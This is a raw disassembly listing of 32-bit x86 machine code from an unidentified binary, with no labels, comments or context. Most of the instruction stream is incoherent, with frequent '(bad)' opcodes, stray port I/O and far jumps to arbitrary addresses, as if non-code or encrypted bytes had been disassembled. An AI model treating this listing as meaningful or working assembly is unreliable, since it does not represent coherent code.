  40e8df:	shr    DWORD PTR [ebx+0x65433988],1
  40e8e5:	(bad)  
  40e8e6:	ja     0x40e942
  40e8e8:	xlat   BYTE PTR ds:[ebx]
  40e8e9:	jecxz  0x40e939
  40e8eb:	sbb    eax,0x30106f6a
  40e8f0:	push   esi
  40e8f1:	fwait
  40e8f2:	in     al,0x6a
  40e8f4:	pop    esp
  40e8f5:	jl     0x40e8e1
  40e8f7:	into   
  40e8f8:	sldt   WORD PTR [eax]
	...
  40e93f:	push   0x7cbe6434
  40e944:	(bad)  
  40e945:	cli    
  40e946:	div    BYTE PTR [ebx-0x662b2b63]
  40e94c:	out    0x2,eax
  40e94e:	adc    al,0xc5
  40e950:	out    dx,eax
  40e951:	add    BYTE PTR [eax],al
  40e953:	and    al,BYTE PTR [edi]
  40e955:	add    BYTE PTR [eax],al
  40e957:	sub    ebx,edi
  40e959:	in     al,0xf3
  40e95b:	sbb    bh,BYTE PTR [ecx+0x6df4ed90]
  40e961:	inc    ebp
  40e962:	(bad)  
  40e964:	fsub   QWORD PTR [eax]
  40e966:	(bad)  
  40e967:	ins    BYTE PTR es:[di],dx
  40e969:	in     eax,0x1
  40e96b:	jecxz  0x40e91d
  40e96d:	add    eax,0x853f1e48
  40e972:	stc    
  40e973:	xor    ebp,DWORD PTR [edi]
  40e975:	sub    ch,ch
  40e977:	xor    eax,0x2e68b270
  40e97c:	repz and edi,0x1da7c3be
  40e983:	aaa    
  40e984:	outs   dx,BYTE PTR ds:[esi]
  40e985:	sub    al,0xb2
  40e987:	(bad)  
  40e988:	in     eax,0x9a
  40e98a:	dec    eax
  40e98b:	lds    esi,FWORD PTR [edx+0x7f]
  40e98e:	dec    esp
  40e98f:	xor    BYTE PTR [edi-0x43],ch
  40e992:	inc    edi
  40e993:	dec    esp
  40e994:	pop    ebp
  40e995:	jg     0x40e9d3
  40e997:	adc    BYTE PTR [eax-0x21],cl
  40e99a:	inc    esp
  40e99b:	xchg   BYTE PTR [ebp-0x7ff00830],bl
  40e9a1:	cmc    
  40e9a2:	push   esp
  40e9a3:	pop    ds
  40e9a4:	add    esp,ebp
  40e9a6:	cwde   
  40e9a7:	xchg   ebp,eax
  40e9a8:	out    0x97,al
  40e9aa:	mov    edi,?
  40e9ac:	pop    esp
  40e9ae:	dec    edi
  40e9af:	lea    esi,[ebx+0x4da98868]
  40e9b5:	pop    edx
  40e9b6:	jp     0x40e95f
  40e9b8:	add    BYTE PTR [esp+eiz*2+0x7b070f4c],ch
  40e9bf:	je     0x40e97a
  40e9c1:	mov    ds,WORD PTR [ecx+0x4a]
  40e9c4:	rol    DWORD PTR [ebx+eiz*4+0xaaf9a11],0xef
  40e9cc:	jne    0x40ea07
  40e9ce:	stos   DWORD PTR es:[edi],eax
  40e9cf:	mov    ch,0x40
  40e9d1:	ds cli 
  40e9d3:	or     al,0xf8
  40e9d5:	inc    edi
  40e9d6:	add    eax,0x26392399
  40e9db:	pop    ebp
  40e9dc:	push   esp
  40e9dd:	push   edi
  40e9de:	(bad)  
  40e9df:	xchg   esp,eax
  40e9e0:	iret   
  40e9e1:	add    ch,ch
  40e9e3:	sbb    cl,al
  40e9e5:	into   
  40e9e6:	mov    ebx,0xb665ed82
  40e9eb:	jo     0x40e9c9
  40e9ed:	and    ecx,DWORD PTR [ebx+ebp*4-0x32e33774]
  40e9f4:	mov    ebp,0xf17788ce
  40e9f9:	or     ebp,DWORD PTR [ebx]
  40e9fb:	xor    eax,0xd50c4fef
  40ea00:	iret   
  40ea01:	stos   BYTE PTR es:[edi],al
  40ea02:	sub    bl,BYTE PTR [edx+0x5d]
  40ea05:	int3   
  40ea06:	idiv   DWORD PTR [eax]
  40ea08:	mov    ebp,0xcbbbfae8
  40ea0d:	xor    eax,0x4141fce7
  40ea12:	test   BYTE PTR [ebx],0x2b
  40ea15:	lods   al,BYTE PTR ds:[esi]
  40ea16:	in     al,dx
  40ea17:	dec    esi
  40ea18:	adc    BYTE PTR [ebx-0x3e68c4a0],bh
  40ea1e:	mov    ch,0xa6
  40ea20:	mov    DWORD PTR [ecx+0xa04e3d2],0x1a3ae93a
  40ea2a:	xchg   BYTE PTR [ebx+ebx*1],cl
  40ea2d:	push   esi
  40ea2e:	inc    edx
  40ea2f:	cwde   
  40ea30:	and    eax,0x81d043ed
  40ea35:	adc    bh,cl
  40ea37:	mov    bl,0x48
  40ea39:	add    cl,al
  40ea3b:	(bad)  
  40ea3c:	jge    0x40eab2
  40ea3e:	mov    al,0xfe
  40ea40:	mov    cl,dl
  40ea42:	mov    eax,ebx
  40ea44:	fcom   QWORD PTR [esi]
  40ea46:	mov    dl,0xc3
  40ea48:	push   cs
  40ea49:	cs ret 
  40ea4b:	pusha  
  40ea4c:	das    
  40ea4d:	pop    esi
  40ea4e:	dec    esi
  40ea4f:	lock pop ss
  40ea51:	pop    eax
  40ea52:	fcom   DWORD PTR [edx-0x5b]
  40ea55:	lahf   
  40ea56:	out    0xba,al
  40ea58:	test   BYTE PTR ds:0x16a0ea83,ch
  40ea5e:	dec    BYTE PTR [ebp+0x65962cbb]
  40ea64:	and    ah,BYTE PTR [ecx]
  40ea66:	jg     0x40eac0
  40ea68:	mov    ecx,0x41d53d5d
  40ea6d:	pop    edx
  40ea6e:	jle    0x40ea0a
  40ea70:	mov    bh,0xfd
  40ea72:	add    DWORD PTR [eax],ebp
  40ea74:	dec    edx
  40ea75:	ret    
  40ea76:	mov    ebp,0x3299f408
  40ea7b:	iret   
  40ea7c:	inc    ebp
  40ea7d:	shl    BYTE PTR [esi-0x67],0x44
  40ea81:	cmovnp edi,DWORD PTR [esi]
  40ea84:	or     DWORD PTR [ecx+edi*8-0x7d],edx
  40ea88:	(bad)  
  40ea89:	rcr    BYTE PTR [ebx+0x12],cl
  40ea8c:	xor    bh,ch
  40ea8e:	ins    BYTE PTR es:[edi],dx
  40ea8f:	(bad)  
  40ea90:	mov    al,ds:0xe0d21ba1
  40ea95:	out    0x3f,eax
  40ea97:	enter  0xd1ad,0x4f
  40ea9b:	mov    dh,0x2a
  40ea9d:	push   0x7ee81842
  40eaa2:	and    BYTE PTR [edi+eiz*4+0x792019a],bl
  40eaa9:	and    eax,DWORD PTR [esi+0x57]
  40eaac:	std    
  40eaad:	sub    eax,0x99060a31
  40eab2:	out    dx,al
  40eab3:	cs xchg edx,eax
  40eab5:	fistp  WORD PTR [edi+0x63]
  40eab8:	cmp    edi,DWORD PTR [eax-0x33540a41]
  40eabe:	dec    esp
  40eabf:	fs test cl,bh
  40eac2:	xchg   ecx,eax
  40eac3:	mov    gs,eax
  40eac5:	test   DWORD PTR [ecx],0x456f34c1
  40eacb:	mov    ecx,0x13570221
  40ead0:	test   esi,edi
  40ead2:	loop   0x40eab8
  40ead4:	test   eax,0x4a98a1f5
  40ead9:	mov    al,0xed
  40eadb:	pop    eax
  40eadc:	cmp    al,0x5c
  40eade:	daa    
  40eadf:	(bad)  
  40eae0:	outs   dx,BYTE PTR ds:[esi]
  40eae1:	ja     0x40ea76
  40eae3:	jge    0x40ea86
  40eae5:	and    al,0x1a
  40eae7:	add    al,0x78
  40eae9:	fsubr  st,st(6)
  40eaeb:	outs   dx,BYTE PTR ds:[esi]
  40eaec:	xor    eax,0xee4c0178
  40eaf1:	push   ds
  40eaf2:	or     DWORD PTR ds:0x354228a0,esp
  40eaf8:	clc    
  40eaf9:	scas   al,BYTE PTR es:[edi]
  40eafa:	xor    ebx,ecx
  40eafc:	xchg   BYTE PTR [edi+0x129f8131],dl
  40eb02:	(bad)  
  40eb03:	in     al,0x30
  40eb05:	pop    es
  40eb06:	bound  eax,QWORD PTR [ebx]
  40eb08:	or     ecx,DWORD PTR [ebp-0x3162b451]
  40eb0e:	loop   0x40eb08
  40eb10:	in     eax,0x71
  40eb12:	js     0x40ea99
  40eb14:	lods   eax,DWORD PTR ds:[esi]
  40eb15:	clc    
  40eb16:	cmc    
  40eb17:	sbb    esi,DWORD PTR [edx+0x78]
  40eb1a:	xchg   BYTE PTR [eax+0x68],cl
  40eb1d:	shr    edi,0x6e
  40eb20:	clc    
  40eb21:	ja     0x40eb84
  40eb23:	xchg   ebx,eax
  40eb24:	sub    al,0x9e
  40eb26:	call   0x9749aad7
  40eb2b:	imul   esp,DWORD PTR [ebx-0x2ea36869],0x6f
  40eb32:	cmp    DWORD PTR [edi+0x54],edi
  40eb35:	jns    0x40eaef
  40eb37:	add    eax,0xdf7f6c77
  40eb3c:	gs leave 
  40eb3e:	rol    BYTE PTR [ecx+0x48],1
  40eb41:	test   BYTE PTR [edx+0x2d5c0719],bh
  40eb47:	mov    eax,0xae88ba95
  40eb4c:	fild   WORD PTR [edi]
  40eb4e:	fdivr  st(4),st
  40eb50:	sub    edi,DWORD PTR ds:0x1949d7b0
  40eb56:	mov    BYTE PTR [edi-0x293f6ace],0x4a
  40eb5d:	xchg   esp,eax
  40eb5e:	mov    cl,0x9a
  40eb60:	test   eax,0x6a2d6bb9
  40eb65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb66:	pop    ss
  40eb67:	test   al,0x26
  40eb69:	inc    edi
  40eb6a:	retf   
  40eb6b:	test   dh,bh
  40eb6d:	je     0x40ebcb
  40eb6f:	xor    DWORD PTR [ecx],ecx
  40eb71:	jno    0x40ebbe
  40eb73:	dec    ebp
  40eb74:	mov    ebp,0xd9d8ecff
  40eb79:	jle    0x40eb70
  40eb7b:	cmp    edx,DWORD PTR [esi-0x27]
  40eb7e:	xchg   ebx,eax
  40eb7f:	mov    al,ds:0x520e2a49
  40eb84:	(bad)  
  40eb85:	jmp    0x78be944c
  40eb8a:	add    BYTE PTR [edx+0x38d03a17],dh
  40eb90:	(bad)  
  40eb91:	adc    al,0xe
  40eb93:	test   BYTE PTR [edx+0x563ef919],dh
  40eb99:	pusha  
  40eb9a:	pop    eax
  40eb9b:	pushf  
  40eb9c:	mov    gs,edi
  40eb9e:	add    eax,0xbf32670d
  40eba3:	adc    al,0x78
  40eba5:	js     0x40eb50
  40eba7:	enter  0xc3fc,0xaf
  40ebab:	push   ebx
  40ebac:	and    esp,DWORD PTR [ecx-0x65]
  40ebaf:	psrad  mm3,QWORD PTR [esi+ebp*2-0x73]
  40ebb4:	mov    esp,0x77c3871d
  40ebb9:	dec    edi
  40ebba:	pop    eax
  40ebbb:	cdq    
  40ebbc:	(bad)  
  40ebbd:	js     0x40eb4a
  40ebbf:	hlt    
  40ebc0:	aam    0x1c
  40ebc2:	pushf  
  40ebc3:	push   edx
  40ebc4:	add    al,0xd0
  40ebc6:	clc    
  40ebc7:	push   ss
  40ebc8:	sub    dh,ah
  40ebca:	pop    ss
  40ebcb:	gs mov WORD PTR ds:[edx+esi*4-0x30500b61],?
  40ebd4:	add    BYTE PTR [ebx-0x1a],cl
  40ebd7:	and    ah,BYTE PTR [ecx+0x72]
  40ebda:	sbb    ebp,edi
  40ebdc:	mov    edi,fs
  40ebde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebdf:	xor    BYTE PTR [edi-0x59],ah
  40ebe2:	jns    0x40ec22
  40ebe4:	inc    eax
  40ebe5:	jb     0x40ec1e
  40ebe7:	mov    ecx,0xc3599fbc
  40ebec:	sbb    eax,0x8bbac921
  40ebf1:	repz dec eax
  40ebf3:	enter  0xfca5,0x47
  40ebf7:	dec    eax
  40ebf8:	xchg   esp,eax
  40ebf9:	call   0x9378:0xef10cdf5
  40ec00:	pop    eax
  40ec01:	std    
  40ec02:	inc    ebx
  40ec03:	icebp  
  40ec04:	je     0x40ebd0
  40ec06:	into   
  40ec07:	test   DWORD PTR [eax],ebp
  40ec09:	jnp    0x40ec33
  40ec0b:	cmp    esi,DWORD PTR [eax-0x6c6531a]
  40ec11:	jmp    0xdcfd:0xd3c0480d
  40ec18:	cmp    edi,0xffffffd8
  40ec1b:	test   BYTE PTR [ebx+0x36],0xe2
  40ec1f:	xor    DWORD PTR [edx-0x10],ebp
  40ec22:	sti    
  40ec23:	xchg   esi,eax
  40ec24:	stos   DWORD PTR es:[edi],eax
  40ec25:	sub    DWORD PTR [ebx+0x70],edi
  40ec28:	and    eax,0x72eefdac
  40ec2d:	je     0x40eca6
  40ec2f:	inc    esi
  40ec30:	jecxz  0x40eca5
  40ec32:	scas   al,BYTE PTR es:[edi]
  40ec33:	fs or  dh,cl
  40ec36:	mov    al,BYTE PTR [ebp+0x1d]
  40ec39:	sbb    al,0xf
  40ec3b:	pop    ds
  40ec3c:	cmc    
  40ec3d:	xor    al,0x4a
  40ec3f:	fisubr DWORD PTR [ecx]
  40ec41:	inc    eax
  40ec42:	(bad)  
  40ec43:	setg   ah
  40ec46:	imul   esi,DWORD PTR [ebp+0x4b],0xffffff95
  40ec4a:	cwde   
  40ec4b:	pop    ds
  40ec4c:	mov    cl,0x35
  40ec4e:	(bad)
  40ec51:	pop    es
  40ec52:	sbb    eax,0xe41a21b6
  40ec57:	push   cs
  40ec58:	cld    
  40ec59:	xor    esp,DWORD PTR [edi-0x4f]
  40ec5c:	fisubr WORD PTR [edi-0x61]
  40ec5f:	fs (bad) 
  40ec61:	mov    ch,BYTE PTR [eax+edx*4+0x12]
  40ec65:	sahf   
  40ec66:	ins    DWORD PTR es:[edi],dx
  40ec67:	nop
  40ec68:	mov    esi,DWORD PTR [ebp+0x49fec2b0]
  40ec6e:	add    bh,al
  40ec70:	and    al,0x57
  40ec72:	pop    ebx
  40ec73:	push   cs
  40ec74:	xor    eax,0x849e593b
  40ec79:	ds aad 0x2c
  40ec7c:	and    ecx,DWORD PTR gs:[ecx]
  40ec7f:	sar    esp,0x22
  40ec82:	clc    
  40ec83:	pop    ebp
  40ec84:	dec    eax
  40ec85:	inc    edi
  40ec86:	aad    0xa7
  40ec88:	adc    al,0x3a
  40ec8a:	xchg   ecx,eax
  40ec8b:	cmp    eax,0x16cd93ee
  40ec90:	push   edi
  40ec91:	sbb    ebx,ebp
  40ec93:	sub    DWORD PTR [ecx],0xffffffd6
  40ec96:	inc    edi
  40ec97:	sub    al,BYTE PTR fs:[ecx]
  40ec9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec9b:	std    
  40ec9c:	jg     0x40ed1a
  40ec9e:	lahf   
  40ec9f:	(bad)  
  40eca0:	pop    eax
  40eca1:	mov    bl,0x2a
  40eca3:	aad    0xee
  40eca5:	pop    DWORD PTR [eax+0x363c2243]
  40ecab:	or     DWORD PTR [ecx-0x7a],esp
  40ecae:	xchg   edx,eax
  40ecaf:	out    0x6c,al
  40ecb1:	mov    al,ds:0x4c227258
  40ecb6:	out    dx,eax
  40ecb7:	or     DWORD PTR [ecx],ebp
  40ecb9:	adc    bh,cl
  40ecbb:	loope  0x40ec54
  40ecbd:	push   ds
  40ecbe:	dec    ecx
  40ecbf:	fistp  DWORD PTR [edi+0x55]
  40ecc2:	mov    bh,0xfc
  40ecc4:	call   DWORD PTR [edi-0x74]
  40ecc7:	cdq    
  40ecc8:	lahf   
  40ecc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecca:	(bad)  
  40eccb:	lahf   
  40eccc:	cdq    
  40eccd:	pusha  
  40ecce:	adc    eax,DWORD PTR [eax]
  40ecd0:	jecxz  0x40ecfe
  40ecd2:	ja     0x40ed45
  40ecd4:	stc    
  40ecd5:	sub    BYTE PTR [edx+ecx*2+0x76],dl
  40ecd9:	pop    es
  40ecda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecdb:	mov    cl,0x51
  40ecdd:	test   eax,0xe6cce03
  40ece2:	mov    cl,0x26
  40ece4:	mov    ebx,0x6b5b2781
  40ece9:	adc    eax,0x66
  40ecec:	inc    ecx
  40eced:	leave  
  40ecee:	jg     0x40ecc1
  40ecf0:	(bad)  
  40ecf1:	repz mov ah,0xe3
  40ecf4:	or     BYTE PTR [edx+eax*1],cl
  40ecf7:	adc    al,0x18
  40ecf9:	xchg   ecx,eax
  40ecfa:	add    al,0x38
  40ecfc:	scas   al,BYTE PTR es:[edi]
  40ecfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecfe:	imul   edx,DWORD PTR [edx+0x4b],0x25e0c7a
  40ed05:	push   cs
  40ed06:	sbb    al,0xbb
  40ed08:	cs cmp eax,0xe4d0575
  40ed0e:	mov    dl,0x15
  40ed10:	cdq    
  40ed11:	sbb    DWORD PTR [eax],ebx
  40ed13:	inc    edx
  40ed14:	outs   dx,DWORD PTR ds:[esi]
  40ed15:	mov    edi,0x2d8741b3
  40ed1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed1b:	lds    ebx,FWORD PTR [esi+0x65]
  40ed1e:	xlat   BYTE PTR ds:[ebx]
  40ed1f:	inc    cx
  40ed21:	test   eax,0x4f4cdbb
  40ed26:	leave  
  40ed27:	pop    ss
  40ed28:	jo     0x40ecde
  40ed2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed2b:	or     al,0x6b
  40ed2d:	push   ds
  40ed2e:	pop    ds
  40ed2f:	inc    DWORD PTR [bx+di+0x1380]
  40ed34:	sbb    dh,ch
  40ed36:	lods   eax,DWORD PTR ds:[esi]
  40ed37:	(bad)  
  40ed39:	loop   0x40ed81
  40ed3b:	jp     0x40edb8
  40ed3d:	ja     0x40ed28
  40ed3f:	jmp    0x40ed6a
  40ed41:	icebp  
  40ed42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed43:	mov    ds:0x17522e6b,al
  40ed48:	(bad)  
  40ed49:	mov    eax,0x2823e137
  40ed4e:	(bad)  
  40ed4f:	dec    ebx
  40ed50:	sbb    eax,0xc8e48004
  40ed55:	mov    ds:0x99429560,al
  40ed5a:	int3   
  40ed5b:	jmp    0xb4df0078
  40ed60:	sbb    al,0xd3
  40ed62:	mov    esp,0xaa689192
  40ed67:	lods   eax,DWORD PTR ds:[esi]
  40ed68:	jmp    0x89e2:0x3c45e22f
  40ed6f:	sbb    al,0xa5
  40ed71:	loopne 0x40edcf
  40ed73:	sub    DWORD PTR [esp+edi*4+0x3d52a187],0x52b25071
  40ed7e:	dec    ebx
  40ed7f:	push   0xffffff99
  40ed81:	stos   DWORD PTR es:[edi],eax
  40ed82:	sbb    al,BYTE PTR [ebx]
  40ed84:	ins    BYTE PTR es:[edi],dx
  40ed85:	mov    ecx,DWORD PTR [eax]
  40ed87:	xor    edx,eax
  40ed89:	push   esi
  40ed8a:	shr    DWORD PTR [ebx+0x43],0x7d
  40ed8e:	push   es
  40ed8f:	or     eax,0x9bf1a92b
  40ed94:	out    0x48,eax
  40ed96:	hlt    
  40ed97:	push   cs
  40ed98:	pop    edx
  40ed99:	mov    esi,0x9d27e650
  40ed9e:	ret    
  40ed9f:	mov    eax,cs
  40eda1:	js     0x40ed2e
  40eda3:	popa   
  40eda4:	cmp    esp,DWORD PTR [eax-0x53cc27d6]
  40edaa:	mov    eax,0xe2e7c698
  40edaf:	push   0x8e13bde0
  40edb4:	jle    0x40ee0f
  40edb6:	inc    edx
  40edb7:	push   ds
  40edb8:	imul   ebx,DWORD PTR [eax],0xfddf119
  40edbe:	jns    0x40ee2d
  40edc0:	shr    BYTE PTR [eax+0x41],0xb5
  40edc4:	retf   
  40edc5:	ins    BYTE PTR es:[edi],dx
  40edc6:	add    ch,BYTE PTR [edi]
  40edc8:	cs popa 
  40edca:	push   esi
  40edcb:	xchg   ecx,eax
  40edcc:	adc    BYTE PTR [esi-0x23b4c440],bl
  40edd2:	or     bl,BYTE PTR ds:0x8e4f9a6c
  40edd8:	dec    edx
  40edd9:	lea    esp,[ecx+eiz*8]
  40eddc:	aaa    
  40eddd:	out    dx,al
  40edde:	outs   dx,DWORD PTR ds:[esi]
  40eddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ede0:	and    ch,BYTE PTR [edx-0x38f0ef67]
  40ede6:	jle    0x40ee36
  40ede8:	clc    
  40ede9:	aad    0x9c
  40edeb:	loop   0x40ee08
  40eded:	repz js 0x40eda6
  40edf0:	test   BYTE PTR [edi],dh
  40edf2:	call   0xc14fa09b
  40edf7:	mov    eax,DWORD PTR [ecx+edx*1-0x3d8af1f0]
  40edfe:	mov    ebp,0xe4e37c81
  40ee03:	pop    ebx
  40ee05:	adc    eax,0x38d58b87
  40ee0a:	cli    
  40ee0b:	call   0xd0048a0e
  40ee10:	push   ecx
  40ee11:	pop    ecx
  40ee12:	ja     0x40ee56
  40ee14:	cmp    dl,al
  40ee16:	or     al,bh
  40ee18:	iret   
  40ee19:	ins    DWORD PTR es:[edi],dx
  40ee1a:	bound  edi,QWORD PTR [eax+0x94b291f]
  40ee20:	in     eax,0xd0
  40ee22:	(bad)  
  40ee23:	outs   dx,DWORD PTR ds:[esi]
  40ee24:	or     DWORD PTR [ecx+0xb8372c7],0x79
  40ee2b:	ins    DWORD PTR es:[edi],dx
  40ee2c:	sub    eax,0x48cf24d3
  40ee31:	call   0x18b:0xeb4d32f4
  40ee38:	dec    esi
  40ee39:	jbe    0x40ee9f
  40ee3b:	adc    ah,0x2b
  40ee3e:	push   ss
  40ee3f:	xlat   BYTE PTR ds:[ebx]
  40ee40:	out    0x6a,eax
  40ee42:	nop
  40ee43:	into   
  40ee44:	pop    ebx
  40ee45:	or     eax,0x83a80b5b
  40ee4a:	in     al,dx
  40ee4b:	ss xchg edi,eax
  40ee4d:	or     eax,0x5f00ab99
  40ee52:	loop   0x40ee24
  40ee54:	cmp    BYTE PTR [ecx-0x73],ch
  40ee57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee58:	and    ebp,DWORD PTR [ecx-0x45]
  40ee5b:	jmp    0x3766d801
  40ee60:	sbb    edi,esi
  40ee62:	jmp    0x5ac3a2e1
  40ee67:	ror    DWORD PTR [edi],cl
  40ee69:	cmp    eax,0x55260c7b
  40ee6e:	mov    ?,edi
  40ee70:	mov    cs,WORD PTR [edx]
  40ee72:	push   ebx
  40ee73:	inc    ebx
  40ee74:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40ee76:	aad    0xd9
  40ee78:	in     eax,0x69
  40ee7a:	mov    ecx,0x5407006e
  40ee7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee80:	into   
  40ee81:	ror    bl,1
  40ee83:	mov    ebp,DWORD PTR [eax+0x22]
  40ee86:	mov    cl,0x13
  40ee88:	jmp    DWORD PTR [edi]
  40ee8a:	pop    esp
  40ee8b:	add    esp,0x20
  40ee8e:	push   eax
  40ee8f:	test   BYTE PTR [edi-0x73],0xad
  40ee93:	cmp    ah,BYTE PTR [eax]
  40ee95:	pop    ss
  40ee96:	and    DWORD PTR [ebx],ebx
  40ee98:	or     ebp,ebp
  40ee9a:	(bad)  
  40ee9b:	popa   
  40ee9c:	dec    edi
  40ee9d:	fadd   st(3),st
  40ee9f:	jae    0x40eec6
  40eea1:	cdq    
  40eea2:	hlt    
  40eea3:	ret    0x864f
  40eea6:	jnp    0x40eeff
  40eea8:	outs   dx,BYTE PTR ds:[esi]
  40eea9:	mov    edx,0x687f6859
  40eeae:	mov    ds:0x1fbcc244,eax
  40eeb3:	sti    
  40eeb4:	dec    eax
  40eeb5:	sub    eax,0x9e1fd9a4
  40eeba:	xor    ah,dh
  40eebc:	clc    
  40eebd:	mov    esi,0xb5652139
  40eec2:	cmp    dl,al
  40eec4:	dec    ecx
  40eec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eec6:	and    esp,DWORD PTR [esi+0x5172b0fb]
  40eecc:	mov    ebx,0xb7799bfb
  40eed1:	loopne 0x40ee9d
  40eed3:	in     eax,0xad
  40eed5:	dec    ebp
  40eed6:	(bad)  
  40eed7:	push   0xefd68186
  40eedc:	mov    dl,0xca
  40eede:	ins    BYTE PTR es:[edi],dx
  40eedf:	rcr    dh,cl
  40eee1:	mov    al,0x30
  40eee3:	xchg   esi,esp
  40eee5:	sbb    esi,DWORD PTR [ecx]
  40eee7:	popf   
  40eee8:	fwait
  40eee9:	ins    DWORD PTR es:[edi],dx
  40eeea:	pop    ebx
  40eeeb:	lea    edi,[eax-0x549e4ba0]
  40eef1:	outs   dx,DWORD PTR ds:[esi]
  40eef2:	sti    
  40eef3:	ja     0x40ee91
  40eef5:	mov    dl,0xda
  40eef7:	enter  0x6217,0xca
  40eefb:	dec    edx
  40eefc:	call   0x2a4efaf6
  40ef01:	aam    0x4c
  40ef03:	arpl   bp,sp
  40ef05:	jg     0x40eea0
  40ef07:	ds dec edx
  40ef09:	div    DWORD PTR [edi]
  40ef0b:	add    BYTE PTR [ebp+0x6d],bh
  40ef0e:	xor    BYTE PTR [eax+0x78],ah
  40ef11:	shl    DWORD PTR [edx],1
  40ef13:	dec    esp
  40ef14:	xchg   edx,eax
  40ef15:	jnp    0x40ef91
  40ef17:	cmp    dh,ah
  40ef19:	xchg   ebx,eax
  40ef1a:	inc    ecx
  40ef1b:	inc    edx
  40ef1c:	fwait
  40ef1d:	rol    BYTE PTR [eax+0x133c2678],0x70
  40ef24:	lods   eax,DWORD PTR ds:[esi]
  40ef25:	int3   
  40ef26:	mov    al,0x8b
  40ef28:	push   eax
  40ef29:	lahf   
  40ef2a:	push   0x8640603f
  40ef2f:	fdiv   QWORD PTR [edx]
  40ef31:	loop   0x40ef12
  40ef33:	in     eax,0x38
  40ef35:	xor    esi,DWORD PTR [ecx]
  40ef37:	jmp    0x40ef68
  40ef39:	add    cl,al
  40ef3b:	jmp    0xb77c:0x6a4aa966
  40ef42:	loop   0x40ef03
  40ef44:	adc    edi,esp
  40ef46:	out    0xf6,eax
  40ef48:	aas    
  40ef49:	xchg   ecx,eax
  40ef4a:	xor    al,0x8d
  40ef4c:	aas    
  40ef4d:	loop   0x40ef68
  40ef4f:	leave  
  40ef50:	xchg   ebx,eax
  40ef51:	inc    esp
  40ef52:	add    eax,0x56a0a3ea
  40ef57:	jb     0x40efa3
  40ef59:	iret   
  40ef5a:	aas    
  40ef5b:	mov    esp,0xb36b934f
  40ef60:	inc    eax
  40ef61:	lods   eax,DWORD PTR ds:[esi]
  40ef62:	xor    ch,dl
  40ef64:	pop    eax
  40ef65:	aas    
  40ef66:	mov    ebp,ebp
  40ef68:	call   DWORD PTR ds:0xeb5e7cb4
  40ef6e:	(bad)  
  40ef6f:	loopne 0x40ef4e
  40ef71:	inc    esp
  40ef72:	in     al,0x88
  40ef74:	sbb    ah,BYTE PTR [ecx+0x71bb4da4]
  40ef7a:	sbb    eax,0x3f71ace0
  40ef7f:	je     0x40efa2
  40ef81:	ja     0x40ef4b
  40ef83:	loope  0x40ef2b
  40ef85:	lahf   
  40ef86:	gs pop esp
  40ef88:	aaa    
  40ef89:	add    al,0xcd
  40ef8b:	cld    
  40ef8c:	sbb    DWORD PTR [esi+0x39],ecx
  40ef8f:	dec    esp
  40ef90:	addr16 mov ebp,0x3f18c6f8
  40ef96:	call   0xfbbd01c7
  40ef9b:	lahf   
  40ef9c:	and    dh,dl
  40ef9e:	add    bh,BYTE PTR [esp+edi*1-0x2a2c6d35]
  40efa5:	test   BYTE PTR [edx-0x22],0x66
  40efa9:	jmp    0xf39:0xf8c90f86
  40efb0:	inc    ebp
  40efb1:	or     edi,ecx
  40efb3:	jmp    DWORD PTR [edx]
  40efb5:	shr    eax,cl
  40efb7:	adc    al,0xe6
  40efb9:	int3   
  40efba:	jge    0x40ef4d
  40efbc:	hlt    
  40efbd:	and    al,0x4
  40efbf:	into   
  40efc0:	stos   DWORD PTR es:[edi],eax
  40efc1:	fcomp  DWORD PTR [esi-0x71]
  40efc4:	inc    DWORD PTR [esp+eiz*4-0x52faf8c7]
  40efcb:	sar    DWORD PTR [ebx-0x40],0x63
  40efcf:	repz repnz fld QWORD PTR [edi-0x2d38ca4]
  40efd8:	fwait
  40efd9:	ins    BYTE PTR es:[edi],dx
  40efda:	rol    cl,1
  40efdc:	sbb    eax,0x5de8342a
  40efe1:	xchg   DWORD PTR [esi-0x290c51fb],edx
  40efe7:	pop    esp
  40efe8:	push   ebx
  40efe9:	dec    ebp
  40efea:	pusha  
  40efeb:	add    bh,dl
  40efed:	loopne 0x40f01c
  40efef:	rcr    BYTE PTR es:[ebx+0x42db65d6],0x4
  40eff7:	jecxz  0x40f02b
  40eff9:	jle    0x40efc4
  40effb:	pop    ebx
  40effc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40effd:	mov    ebx,0x1d85d362
  40f002:	mov    al,0xbe
  40f004:	pusha  
  40f005:	pop    ds
  40f006:	pop    es
  40f007:	enter  0x2047,0x79
  40f00b:	mov    dh,0xac
  40f00d:	push   esp
  40f00e:	inc    edx
  40f00f:	or     ebx,ebx
  40f011:	jge    0x40efae
  40f013:	iret   
  40f014:	lahf   
  40f015:	fs hlt 
  40f017:	pushf  
  40f018:	add    eax,0x6d7405af
  40f01d:	mov    esi,0xea0456ca
  40f022:	or     BYTE PTR [edx+0x8],0x5
  40f026:	test   BYTE PTR [eax],bh
  40f028:	jb     0x40f09b
  40f02a:	inc    ecx
  40f02b:	jg     0x40f091
  40f02d:	out    dx,al
  40f02e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f02f:	xchg   edi,eax
  40f030:	enter  0xc97f,0xeb
  40f034:	(bad)  
  40f036:	repz xchg esi,eax
  40f038:	push   ebx
  40f039:	push   es
  40f03a:	lea    eax,[eax]
  40f03c:	push   edi
  40f03d:	or     edx,edi
  40f03f:	hlt    
  40f040:	add    esp,ebp
  40f042:	and    dh,BYTE PTR [esi+0x25]
  40f045:	sbb    ch,BYTE PTR ds:0x3e5f6a9a
  40f04b:	sub    eax,0x320cd7a9
  40f050:	inc    ecx
  40f051:	ins    DWORD PTR es:[edi],dx
